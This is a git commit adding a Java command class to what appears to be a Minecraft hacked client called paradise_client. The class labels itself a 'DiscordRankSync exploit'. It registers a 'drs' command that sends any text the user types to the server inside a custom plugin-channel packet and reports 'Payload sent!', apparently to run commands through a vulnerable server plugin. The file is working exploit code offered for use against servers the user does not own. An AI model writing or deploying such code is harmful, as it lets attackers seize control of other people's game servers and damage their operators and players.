b5de1bc4fc1e1d1f8b3d3ff56e9ad9ce6a6fb919
Joyel99Dev <164185653+McpeDX@users.noreply.github.com>
2025-09-04 18:25:01 +0530

    Create DiscordRankSync.java

---
+++ src/main/java/net/paradise_client/command/impl/DiscordRankSync.java
@@ -0,0 +1,37 @@
+package net.paradise_client.command.impl;
+
+import com.mojang.brigadier.arguments.StringArgumentType;
+import com.mojang.brigadier.builder.LiteralArgumentBuilder;
+import com.mojang.brigadier.context.CommandContext;
+import net.paradise_client.Helper;
+import net.minecraft.command.CommandSource;
+import net.minecraft.network.packet.c2s.common.CustomPayloadC2SPacket;
+import net.paradise_client.command.Command;
+import net.paradise_client.packet.DiscordRankSyncPacket;
+
+public class DiscordRankSync extends Command {
+    public DiscordRankSync() {
+        super("drs", "DiscordRankSync exploit", false);
+    }
+
+    @Override
+    public void build(LiteralArgumentBuilder<CommandSource> root) {
+        root
+            .executes(this::incompleteCommand)
+            .then(
+                argument("command", StringArgumentType.greedyString())
+                    .executes(context -> {
+                        Helper.sendPacket(new CustomPayloadC2SPacket(
+                            new DiscordRankSyncPacket(context.getArgument("command", String.class))
+                        ));
+                        Helper.printChatMessage("Payload sent!");
+                        return SINGLE_SUCCESS;
+                    })
+            );
+    }
+
+    private int incompleteCommand(CommandContext<CommandSource> context) {
+        Helper.printChatMessage("Incomplete command!");
+        return SINGLE_SUCCESS;
+    }
+}
